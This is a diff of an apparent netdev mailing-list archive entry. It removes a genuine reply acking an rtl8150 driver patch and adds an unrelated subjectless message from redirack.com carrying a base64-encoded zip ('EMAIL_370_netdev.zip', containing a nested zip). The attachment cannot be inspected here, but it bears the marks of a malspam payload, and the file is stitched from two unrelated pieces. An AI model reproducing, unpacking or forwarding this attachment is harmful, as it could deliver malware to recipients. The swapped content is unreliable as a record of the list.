@@ -1,119 +1,102 @@
-From: Petko Manolov <petkan@nucleusys.com>
-Subject: Re: [PATCH] net: usb: rtl8150: use new api
- ethtool_{get|set}_link_ksettings
-Date: Tue, 14 Mar 2017 19:12:59 +0200
-Message-ID: <20170314171259.p5ag5a5656elqdg7@p310>
-References: <1489356985-24117-1-git-send-email-tremyfr@gmail.com>
- <20170313150020.25ibsslebcscmngb@p310>
+From: <informationrequest@redirack.com>
+Subject: (unknown)
+Date: Tue, 14 Mar 2017 17:20:51 -0000
+Message-ID: <148951205125.14277.3797933862626840685@vnpt.vn>
+Reply-To: <informationrequest@redirack.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: davem@davemloft.net, linux-usb@vger.kernel.org,
-        netdev@vger.kernel.org, linux-kernel@vger.kernel.org
-To: Philippe Reynes <tremyfr@gmail.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20170313150020.25ibsslebcscmngb@p310>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_370_netdev.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from static.vnpt.vn ([14.169.168.44]:54623 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753000AbdCNRU6 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Tue, 14 Mar 2017 13:20:58 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On 17-03-13 17:00:20, Petko Manolov wrote:
-> On 17-03-12 23:16:25, Philippe Reynes wrote:
-> > The ethtool api {get|set}_settings is deprecated. We move this driver to new 
-> > api {get|set}_link_ksettings.
-> > 
-> > As I don't have the hardware, I'd be very pleased if someone may test this 
-> > patch.
-> 
-> I've got some old adapters around and will drop you a line when i test the 
-> patch.
-
-The adapter is working fine with your patch.  You may add:
-
-Acked-by: Petko Manolov <petkan@nucleusys.com>
-
-
-cheers,
-Petko
-
-
-> > Signed-off-by: Philippe Reynes <tremyfr@gmail.com>
-> > ---
-> >  drivers/net/usb/rtl8150.c |   35 ++++++++++++++++++++---------------
-> >  1 files changed, 20 insertions(+), 15 deletions(-)
-> > 
-> > diff --git a/drivers/net/usb/rtl8150.c b/drivers/net/usb/rtl8150.c
-> > index c81c791..daaa88a 100644
-> > --- a/drivers/net/usb/rtl8150.c
-> > +++ b/drivers/net/usb/rtl8150.c
-> > @@ -791,47 +791,52 @@ static void rtl8150_get_drvinfo(struct net_device *netdev, struct ethtool_drvinf
-> >  	usb_make_path(dev->udev, info->bus_info, sizeof(info->bus_info));
-> >  }
-> >  
-> > -static int rtl8150_get_settings(struct net_device *netdev, struct ethtool_cmd *ecmd)
-> > +static int rtl8150_get_link_ksettings(struct net_device *netdev,
-> > +				      struct ethtool_link_ksettings *ecmd)
-> >  {
-> >  	rtl8150_t *dev = netdev_priv(netdev);
-> >  	short lpa, bmcr;
-> > +	u32 supported;
-> >  
-> > -	ecmd->supported = (SUPPORTED_10baseT_Half |
-> > +	supported = (SUPPORTED_10baseT_Half |
-> >  			  SUPPORTED_10baseT_Full |
-> >  			  SUPPORTED_100baseT_Half |
-> >  			  SUPPORTED_100baseT_Full |
-> >  			  SUPPORTED_Autoneg |
-> >  			  SUPPORTED_TP | SUPPORTED_MII);
-> > -	ecmd->port = PORT_TP;
-> > -	ecmd->transceiver = XCVR_INTERNAL;
-> > -	ecmd->phy_address = dev->phy;
-> > +	ecmd->base.port = PORT_TP;
-> > +	ecmd->base.phy_address = dev->phy;
-> >  	get_registers(dev, BMCR, 2, &bmcr);
-> >  	get_registers(dev, ANLP, 2, &lpa);
-> >  	if (bmcr & BMCR_ANENABLE) {
-> >  		u32 speed = ((lpa & (LPA_100HALF | LPA_100FULL)) ?
-> >  			     SPEED_100 : SPEED_10);
-> > -		ethtool_cmd_speed_set(ecmd, speed);
-> > -		ecmd->autoneg = AUTONEG_ENABLE;
-> > +		ecmd->base.speed = speed;
-> > +		ecmd->base.autoneg = AUTONEG_ENABLE;
-> >  		if (speed == SPEED_100)
-> > -			ecmd->duplex = (lpa & LPA_100FULL) ?
-> > +			ecmd->base.duplex = (lpa & LPA_100FULL) ?
-> >  			    DUPLEX_FULL : DUPLEX_HALF;
-> >  		else
-> > -			ecmd->duplex = (lpa & LPA_10FULL) ?
-> > +			ecmd->base.duplex = (lpa & LPA_10FULL) ?
-> >  			    DUPLEX_FULL : DUPLEX_HALF;
-> >  	} else {
-> > -		ecmd->autoneg = AUTONEG_DISABLE;
-> > -		ethtool_cmd_speed_set(ecmd, ((bmcr & BMCR_SPEED100) ?
-> > -					     SPEED_100 : SPEED_10));
-> > -		ecmd->duplex = (bmcr & BMCR_FULLDPLX) ?
-> > +		ecmd->base.autoneg = AUTONEG_DISABLE;
-> > +		ecmd->base.speed = ((bmcr & BMCR_SPEED100) ?
-> > +					     SPEED_100 : SPEED_10);
-> > +		ecmd->base.duplex = (bmcr & BMCR_FULLDPLX) ?
-> >  		    DUPLEX_FULL : DUPLEX_HALF;
-> >  	}
-> > +
-> > +	ethtool_convert_legacy_u32_to_link_mode(ecmd->link_modes.supported,
-> > +						supported);
-> > +
-> >  	return 0;
-> >  }
-> >  
-> >  static const struct ethtool_ops ops = {
-> >  	.get_drvinfo = rtl8150_get_drvinfo,
-> > -	.get_settings = rtl8150_get_settings,
-> > -	.get_link = ethtool_op_get_link
-> > +	.get_link = ethtool_op_get_link,
-> > +	.get_link_ksettings = rtl8150_get_link_ksettings,
-> >  };
-> >  
-> >  static int rtl8150_ioctl(struct net_device *netdev, struct ifreq *rq, int cmd)
-> > -- 
-> > 1.7.4.4
-> > 
-> > 
+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
